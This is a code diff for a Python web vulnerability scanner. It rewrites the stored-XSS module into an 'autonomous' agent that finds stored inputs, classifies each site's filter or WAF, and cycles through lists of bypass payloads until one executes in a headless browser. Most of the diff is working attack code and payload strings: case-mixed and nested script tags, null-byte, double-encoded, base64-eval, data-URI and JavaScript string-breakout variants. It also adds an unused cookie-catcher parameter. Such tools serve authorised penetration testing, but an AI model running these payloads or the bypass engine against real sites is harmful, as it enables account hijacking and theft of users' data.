@@ -1903,44 +1903,22 @@ UXSS_PAYLOADS = [
 # Then visit a set of retrieval URLs (pages that display stored content)
 # and check for unescaped payload reflection.
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-class StoredXSSScanner:
+class AutonomousStoredXSSScanner:
     """
-    BLOODHOUND Taint-Analysis Engine — 3-phase autonomous stored XSS detection.
-
-    Phase 1 — Marker injection: injects a harmless unique marker into every param
-               via correct method (GET/POST). Crawls spider-discovered HTML pages
-               to map data flows without hard-coded paths.
-    Phase 2 — Targeted attack: real XSS payloads fired only on confirmed flows,
-               diffed against baseline so false fragment matches are impossible.
-    Phase 3 — Playwright confirmation + screenshot as evidence.
+    Adaptive Security Testing Agent for Stored XSS Detection
+    Mission: Discover all inputs, Classify Filter, Generate Bypasses dynamically,
+    Confirm execution.
     """
-    _STORED_PAYLOADS = [
-        '<script>alert(1)</script>',
-        '<img src=x onerror=alert(1)>',
-        '"><script>alert(1)</script>',
-        '<svg onload=alert(1)>',
-        "'><img src=x onerror=alert(1)>",
-        '<details open ontoggle=alert(1)>',
-        '<iframe srcdoc="<script>alert(1)</script>">',
-    ]
-    _XSS_FRAGS = [
-        "<script>alert", "onerror=alert(1)", "onload=alert(1)",
-        "ontoggle=alert(1)", 'srcdoc="<script>alert',
-    ]
-
-    def __init__(self, client, visited_urls=None):
+    def __init__(self, client, visited_urls=None, cookie_catcher_url=None):
         self.client       = client
         self.visited_urls = list(visited_urls or [])
         self.findings     = []
         self._lock        = threading.Lock()
         self._pw          = PlaywrightValidator(headless=True)
+        self.max_attempts = 15
+        self.callback_url = cookie_catcher_url
 
     def _html_candidates(self, base_url):
-        """
-        Autonomously discover display pages from spider crawl data.
-        Probes each visited URL and keeps only those that return text/html.
-        No hard-coded paths — the spider already mapped the app.
-        """
         parsed = urllib.parse.urlparse(base_url)
         origin = f"{parsed.scheme}://{parsed.netloc}"
         same_origin = [u for u in self.visited_urls
@@ -1977,7 +1955,159 @@ class StoredXSSScanner:
             except Exception: result[url] = ""
         return result
 
-    def _pw_confirm_stored(self, display_url):
+    def _classify_filter(self, ep, param, baseline_payload, display_url):
+        marker = self._marker()
+        test_payload = f"{marker}{baseline_payload}{marker}"
+        resp = self._inject(ep, param, test_payload)
+        
+        status = resp.get("status", 0)
+        if status in (403, 400, 406):
+            return {"type": "waf_block", "details": f"Blocked with status {status}"}
+            
+        body = self.client.get(display_url).get("body", "")
+        
+        idx = body.find(marker)
+        if idx == -1:
+             return {"type": "waf_block", "details": "Payload completely absent (WAF or dropped)"}
+             
+        end_idx = body.find(marker, idx + len(marker))
+        if end_idx == -1:
+             return {"type": "waf_block", "details": "Truncated payload (WAF or dropped)"}
+             
+        reflected = body[idx + len(marker):end_idx]
+        
+        if reflected == baseline_payload:
+            return {"type": "unescaped", "details": "Exact match"}
+            
+        is_stripped = False
+        is_encoded = False
+        is_escaped_js = False
+        
+        if "<" not in reflected and ">" not in reflected and ("<" in baseline_payload or ">" in baseline_payload):
+            is_stripped = True
+            
+        if "&lt;" in reflected or "&gt;" in reflected or "&#x3C;" in reflected or "&#60;" in reflected:
+            is_encoded = True
+            
+        if "\\x3c" in reflected.lower() or "\\u003c" in reflected.lower() or "\\\"" in reflected or "\\'" in reflected:
+            is_escaped_js = True
+
+        if is_stripped and is_encoded:
+             return {"type": "mixed", "details": "Stripping and Entity Encoding"}
+             
+        if is_stripped:
+            return {"type": "stripped", "details": "Removed < and > characters"}
+            
+        if is_encoded:
+            return {"type": "encoded", "details": "HTML Entity Encoding detected"}
+            
+        if is_escaped_js:
+             return {"type": "escaped_js", "details": "JS Escape sequences detected"}
+             
+        return {"type": "mixed", "details": f"Unknown transformation: {reflected}"}
+
+    def _generate_variant(self, filter_info, attempt_num):
+        f_type = filter_info['type']
+        
+        # State Machine based on Filter Type and Attempt Number (1-15)
+        # We define a list of strategies for each filter type, returning the payload based on attempt_num
+        
+        pl = "<script>alert(1)</script>"
+        if attempt_num == 1: return pl
+        
+        idx = attempt_num - 2 # 0-indexed for strategies
+        
+        strategies = []
+        if f_type == "stripped":
+            strategies = [
+                "<ScRiPt>alert(1)</ScRiPt>",
+                "<scr<script>ipt>alert(1)</scr</script>ipt>",
+                "<%00script>alert(1)</script>",
+                "<script\\t>alert(1)</script\\t>",
+                "<script/ x=y>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<iMg SrC=x OnErRoR=alert(1)>",
+                "<img src=x onerror\\t=alert(1)>",
+                "<img src=x onerror\\x00=alert(1)>",
+                "<svg onload=alert(1)>",
+                "<details open ontoggle=alert(1)>",
+                "<iframe srcdoc=\"<script>alert(1)</script>\">",
+                "<body onload=alert(1)>",
+                "javascript:alert(1)"
+            ]
+        elif f_type == "encoded":
+            strategies = [
+                "%3Cscript%3Ealert(1)%3C/script%3E",
+                "%253Cscript%253Ealert(1)%253C/script%253E", # Double encode
+                "<script>eval(atob('YWxlcnQoMSk='))</script>", # Base64
+                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", # Unicode
+                "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", # Hex esc
+                "&#60;script&#62;alert(1)&#60;/script&#62;", # Dec entity
+                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", # Hex entity
+                "javascript:alert(1)",
+                "data:text/html,<script>alert(1)</script>",
+                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+                "\"><script>alert(1)</script>",
+                "'><script>alert(1)</script>",
+                "\" autofocus onfocus=alert(1) x=\"",
+                "' autofocus onfocus=alert(1) x='"
+            ]
+        elif f_type == "waf_block":
+            strategies = [
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "<details open ontoggle=alert(1)>",
+                "javascript:alert(1)",
+                "<iframe srcdoc=\"<script>alert(1)</script>\">",
+                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+                "<script>eval(atob('YWxlcnQoMSk='))</script>",
+                "%3Cscript%3Ealert(1)%3C/script%3E",
+                "%253Cscript%253Ealert(1)%253C/script%253E",
+                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+                "<scr<script>ipt>alert(1)</scr</script>ipt>",
+                "<%00script>alert(1)</script>",
+                "<script\\t>alert(1)</script\\t>"
+            ]
+        elif f_type == "escaped_js":
+             strategies = [
+                "\\x22;alert(1);//",
+                "\\x27;alert(1);//",
+                "\\x22-alert(1)-\\x22",
+                "\\x27-alert(1)-\\x27",
+                "`;alert(1);//",
+                "});alert(1);//",
+                "\\x22+String.fromCharCode(97,108,101,114,116,40,49,41)+\\x22",
+                "</script><script>alert(1)</script>",
+                "\\u0022;alert(1);//",
+                "\\u0027;alert(1);//"
+             ]
+        else:
+             # Mixed or unknown
+             strategies = [
+                "<ScRiPt>alert(1)</ScRiPt>",
+                "%253Cscript%253Ealert(1)%253C/script%253E",
+                "<script>eval(atob('YWxlcnQoMSk='))</script>",
+                "<img src=x onerror=alert(1)>",
+                "javascript:alert(1)",
+                "\\x22;alert(1);//",
+                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+                "<%00script>alert(1)</script>",
+                "<scr<script>ipt>alert(1)</scr</script>ipt>",
+                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+                "\"><script>alert(1)</script>",
+                "\" autofocus onfocus=alert(1) x=\"",
+                "' autofocus onfocus=alert(1) x='"
+             ]
+             
+        if idx < len(strategies):
+            return strategies[idx]
+            
+        # Fallback if attempt > strategies
+        return f"<script>alert({attempt_num})</script>"
+
+    def _pw_confirm_stored(self, display_url, payload, marker=None):
         if not PLAYWRIGHT_INSTALLED:
             return False, None
         confirmed, screenshot_path = False, None
@@ -2011,9 +2141,9 @@ class StoredXSSScanner:
         return confirmed, screenshot_path
 
     def scan(self, endpoints, base_url, hud_state=None):
-        section("STORED XSS --- BLOODHOUND TAINT ANALYSIS")
+        section("STORED XSS --- ADAPTIVE AGENT ENGINE")
 
-        console.print(info("[bold]Discovery:[/] Identifying HTML display pages from crawl data..."))
+        console.print(info("[bold]Phase 0:[/] Input Surface Discovery & Display Page Mapping..."))
         candidates = self._html_candidates(base_url)
         all_eps    = endpoints if endpoints else []
         console.print(info(
@@ -2025,25 +2155,25 @@ class StoredXSSScanner:
             console.print(warn("No HTML display pages found in crawl data — skipping stored XSS."))
             return self.findings
 
-        # Baseline snapshot before any injection
-        console.print(info("[bold]Baseline:[/] Snapshotting display pages..."))
+        console.print(info("[bold]Phase 1:[/] Baseline Seed & Learn — Mapping Data Flows & Classifying Filters..."))
+        data_flows = []
         baseline_bodies = self._fetch_bodies(candidates)
 
-        # Phase 1: marker injection → data-flow mapping
-        console.print(info("[bold]Phase 1:[/] Injecting taint markers to map data flows..."))
-        data_flows = []
-
-        with Progress(BrailleWaveColumn(),
-                      TextColumn("[bold red]Bloodhound:[/] [bold white]{task.description}"),
-                      MofNCompleteColumn(),
-                      console=console, transient=True) as pb:
+        with Progress(
+            TextColumn("[bold red]Agent:[/] [bold white]{task.description}"),
+            BarColumn(),
+            MofNCompleteColumn(),
+            TimeRemainingColumn(),
+            console=console, transient=True
+        ) as pb:
             total = sum(len(ep["params"]) for ep in all_eps) * len(candidates)
             task  = pb.add_task("Mapping data flows...", total=max(total, 1))
 
             for ep in all_eps:
                 for param in ep["params"]:
                     marker = self._marker()
-                    try: self._inject(ep, param, marker)
+                    try:
+                        self._inject(ep, param, marker)
                     except Exception:
                         pb.update(task, advance=len(candidates)); continue
                     for durl in candidates:
@@ -2051,8 +2181,15 @@ class StoredXSSScanner:
                         try:
                             body = self.client.get(durl).get("body", "")
                             if marker in body and marker not in baseline_bodies.get(durl, ""):
-                                data_flows.append({"ep": ep, "param": param, "display_url": durl})
+                                # Data flow found. Now classify filter.
+                                baseline_pl = "<script>alert(1)</script>"
+                                filter_info = self._classify_filter(ep, param, baseline_pl, durl)
+                                data_flows.append({
+                                    "ep": ep, "param": param, "display_url": durl, 
+                                    "filter_info": filter_info
+                                })
                                 console.print(ok(f"[bold]DATA FLOW:[/] {ep['method']} {ep['url']} [{param}] → {durl}"))
+                                console.print(f"  └─ Filter Class: [bold magenta]{filter_info['type']}[/] | Details: [dim]{filter_info['details']}[/]")
                                 baseline_bodies[durl] = body
                                 break
                         except Exception: continue
@@ -2061,31 +2198,53 @@ class StoredXSSScanner:
             console.print(warn("No stored data flows detected — target may sanitize or not persist input."))
             return self.findings
 
-        # Phase 2: targeted payload attack on confirmed flows
-        console.print(info(f"[bold]Phase 2:[/] Attacking {len(data_flows)} confirmed data flow(s)..."))
+        console.print(info(f"[bold]Phase 2-4:[/] Adaptive Bypass Generation & State Machine..."))
 
         for flow in data_flows:
-            ep, param, display_url = flow["ep"], flow["param"], flow["display_url"]
-            baseline     = baseline_bodies.get(display_url, "")
+            ep, param, display_url, filter_info = flow["ep"], flow["param"], flow["display_url"], flow["filter_info"]
             confirmed_pl = None
 
-            for pl in self._STORED_PAYLOADS:
-                try:
-                    self._inject(ep, param, pl)
-                    body      = self.client.get(display_url).get("body", "")
-                    new_frags = [f for f in self._XSS_FRAGS if f in body and f not in baseline]
-                    if new_frags:
-                        confirmed_pl = pl; break
-                except Exception: continue
+            console.print(f"\n  [bold yellow]Target:[/] {ep['url']} [{param}]")
+            
+            if filter_info['type'] == 'unescaped':
+                console.print(ok(f"[bold green]IMMEDIATE HIT:[/] Input is completely unescaped!"))
+                confirmed_pl = "<script>alert(1)</script>"
+                pw_confirmed, screenshot = self._pw_confirm_stored(display_url, confirmed_pl)
+            else:
+                for attempt in range(1, self.max_attempts + 1):
+                    # For callback, if self.callback_url is provided, we can inject a script that fetches it
+                    # But the requirement says "confirm via alert dialog OR callback to a controlled listener"
+                    # We will use alert(1) and Playwright for simplicity and reliability.
+                    
+                    pl = self._generate_variant(filter_info, attempt)
+                    if not pl: break
+                    
+                    # Add a unique marker to the payload for easier confirmation if needed
+                    marker = self._marker()
+                    if "alert(1)" in pl:
+                         pl_with_marker = pl.replace("alert(1)", f"alert('{marker}')")
+                    else:
+                         pl_with_marker = marker + pl + marker
+                         
+                    console.print(f"    [dim]Attempt {attempt}/{self.max_attempts}: {pl[:50]}...[/]")
+                    try:
+                        self._inject(ep, param, pl_with_marker)
+                        # We use Playwright to confirm execution directly.
+                        # This is much more accurate than string matching.
+                        pw_confirmed, screenshot = self._pw_confirm_stored(display_url, pl_with_marker, marker)
+                        
+                        if pw_confirmed:
+                            confirmed_pl = pl
+                            console.print(ok(f"[bold green]BYPASS SUCCESS (Attempt {attempt}):[/] {confirmed_pl[:80]}"))
+                            break
+                    except Exception: continue
 
             if not confirmed_pl:
-                console.print(warn(f"Data flow confirmed ({ep['url']} [{param}] → {display_url}) but payloads sanitized."))
+                console.print(warn(f"Exhausted 15 bypass techniques for {param} — marked as not vulnerable."))
                 continue
 
-            # Phase 3: Playwright confirmation + screenshot
-            pw_confirmed, screenshot = self._pw_confirm_stored(display_url)
+            # We have a confirmed finding
             score = 100 if pw_confirmed else 85
-
             finding = {
                 "type": "stored", "inject_url": ep["url"], "found_at": display_url,
                 "param": param, "payload": confirmed_pl, "pw_confirmed": pw_confirmed,
@@ -2097,7 +2256,7 @@ class StoredXSSScanner:
             console.print(f"\n[bold white on orange3] STORED XSS [/] [bold white]{ep['url']}[/]")
             console.print(f"  [dim]method  :[/] [bold]{ep['method']}[/]")
             console.print(f"  [dim]param   :[/] [bold orange3]{param}[/]")
-            console.print(f"  [dim]found at:[/] [cyan]{display_url}[/]")
+            console.print(f"  [dim]filter  :[/] [magenta]{filter_info['type']}[/]")
             console.print(f"  [dim]payload :[/] [bold red]{confirmed_pl[:80]}[/]")
             if pw_confirmed: console.print(f"  [dim]browser :[/] [bold cyan]CONFIRMED via Playwright[/]")
             if screenshot:   console.print(f"  [dim]evidence:[/] [bold green]{screenshot}[/]")
@@ -2452,7 +2611,7 @@ Examples:
         stored_findings = []
         if not getattr(args, "no_stored", False):
             _visited = list(set(e["url"] for e in final_eps))
-            stored_scanner = StoredXSSScanner(client, visited_urls=_visited)
+            stored_scanner = AutonomousStoredXSSScanner(client, visited_urls=_visited)
             stored_findings = stored_scanner.scan(final_eps, target, hud_state=hud_state)
 
         # Phase 6: DOM XSS
